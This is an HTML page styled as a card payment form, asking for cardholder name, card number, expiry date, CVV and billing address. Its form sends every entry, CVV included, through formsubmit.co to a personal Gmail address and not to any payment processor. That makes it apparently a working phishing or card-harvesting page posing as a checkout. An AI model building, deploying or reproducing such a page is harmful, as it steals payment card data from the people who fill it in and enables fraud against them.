<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Card Payment Details</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 20px;
      background-color: #f2f2f2;
    }
    form {
      background-color: white;
      padding: 20px;
      max-width: 500px;
      margin: auto;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      margin-top: 20px;
      background-color: #28a745;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #218838;
    }
  </style>
</head>
<body>

  <form action="https://formsubmit.co/goodhome267@gmail.com" method="POST">
   
    <h2>Enter Card Details</h2>

    <label for="cardName">Cardholder Name</label>
    <input type="text" id="cardName" name="cardName" required>

    <label for="cardNumber">Card Number</label>
    <input type="text" id="cardNumber" name="xxxx-xxxx-xxxx-xxxx" maxlength="16" required>

    <label for="expiry">Expiry Date (MM/YY)</label>
    <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required>

    <label for="cvv">CVV</label>
    <input type="text" id="cvv" name="xxx" maxlength="3" required>

    <label for="billing">Billing Address</label>
    <input type="text" id="billing address"required>

    <button type="submit">Submit Payment</button>
  </form>

</body>
</html>
